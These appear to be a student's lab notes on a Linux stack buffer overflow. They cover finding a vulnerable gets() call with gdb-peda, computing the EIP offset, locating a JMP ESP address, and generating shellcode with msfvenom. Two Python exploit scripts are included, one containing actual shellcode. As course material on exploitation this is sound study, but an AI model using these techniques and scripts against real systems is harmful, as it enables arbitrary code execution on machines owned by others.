exploit - is attacking a vulnerability
payload - is the desired effect like putting a bomb once exploited

Heap – memory that can be allocated and deallocated as needed.
Stack – a contiguous section of memory used for passing arguments to other functions and general housekeeping.

buffer overflow - too much memory 

the gets() is vulnerable to buffer overflow
Ax24  keylength = 20 bits

STACK:
__
|  EAX: AAAAAAAAA
|  EIP: AAAA = JMP ESP
|  ESP: shellcode
|  EBP:
__
HEAP:
__
|
__

Tools for today: GDB for linux and IMMUNITY for windows

DEMO:

`file func` see that its ELF so should look at on linux and not windows
`strings func` see gets which is vulnerable, and enter a string and gcc version it was compiled on, 
a few directories...clue ip addresses might be in here possibly
`./func` tells to enter a string:
`./func "Hello World"` wont work
`./func <<<$(echo "Hello World")` this works and takes message as user input and not command line input. REMEMBER THIS
`./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")` gives a segmentation fault that is overflow
`gdb ./func` open a red prompt by peda
`gdb-peda$ disass main` see functions
`gdb-peda$ disass getuserinput` highlights vulnerable functions in red
`run`

[https://wiremask.eu/
](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)https://wiremask.eu/tools/buffer-overflow-pattern-generator/

get random size buffer overflow
`run <<<$(echo "ctrl+shift+v pattern")`
see that overwrote EAX, ESP, and EBX...

look at EIP to get the offset ...***

```
student@lin-ops:~/Downloads$ env - gdb ./func
>>> show env
>>> unset env COLUMS
>>> unset env LINES
>>> show env
```
deletes enviornmental variables 

need to now crash program
```>>> run
>>> enter a string:
>>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
>>> segmentation fault 
```
good we wanted it to crash

```
>>> info proc map
>>> find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
```
address after [heap], to end of [stack], JMP, ESP

mybuff.py: 
```
#!/usr/bin/python2.7



#OFFSET

buf = "A" * 62 #OFFSET
'''
memory address fro jmp esp (convert from little ind -> big
0xf7de3b59 -> /x59/x3b/xde/xf7
0xf7f588ab
0xf7f645fb
'''
buf += "/x59/x3b/xde/xf7" #EIP register - JMP ESP
buf += "C" * 20

print(buf)

```


student@lin-ops:~/Desktop/Security$ msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
student@lin-ops:~/Desktop/Security$ msfvenom -p linux/x86/exec CMD="whoami && ifconfig" -b '\x00' -f python

sometimes doesn't work oops just re-generate the shell code

```
#!/usr/bin/python2.7



#OFFSET

buf = "A" * 62 #OFFSET
'''
memory address fro jmp esp (convert from little ind -> big
0xf7de3b59 -> \x59\x3b\xde\xf7
0xf7f588ab
0xf7f645fb
'''
buf += "\x59\x3b\xde\xf7" #EIP register - JMP ESP
#msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
buf += "\x90" * 10 #NOP sled
buf += b"\xba\x0b\xa8\x92\x57\xda\xc0\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x0c\x83\xc7\x04\x31\x57\x0e\x03\x5c"
buf += b"\xa6\x70\xa2\x08\xbd\x2c\xd4\x9e\xa7\xa4\xcb\x7d"
buf += b"\xa1\xd2\x7c\xae\xc2\x74\x7d\xd8\x0b\xe7\x14\x76"
buf += b"\xdd\x04\xb4\x6e\xd4\xca\x39\x6e\x8e\xac\x5a\x01"
buf += b"\x3e\x57\xf4\xba\xbe\xc0\x55\xcd\x5e\x23\xd9"

print(buf)
```




0xf7def000, 0xffffe000, 

